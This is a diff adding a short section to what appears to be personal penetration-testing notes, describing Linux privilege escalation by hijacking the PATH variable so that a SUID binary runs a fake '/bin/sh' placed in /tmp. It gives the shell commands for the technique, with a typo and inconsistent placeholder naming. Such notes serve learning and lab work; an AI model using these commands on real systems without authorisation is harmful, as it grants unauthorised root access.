@@ -24,3 +24,16 @@
        except:
             print("Didn't work")
             sys.exit()
+
+### PRIVESC WITH PATH VARIABLE MANIPULATION
+- If a binary does not detail the path to run another binary e.g not using (/usr/bin/curl)
+
+    ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/f0562606-ec66-47bb-a419-9293ca0a62f1)
+
+- You can manipulate the path and get a root shell.It should be noted the binary you are exploiting must have a suidbit
+
+      cd /tmp
+      echo "/bin/sh" > <binary you eant to attack>
+      chmod 700 curl
+      export PATH=/tmp:$PATH
+      
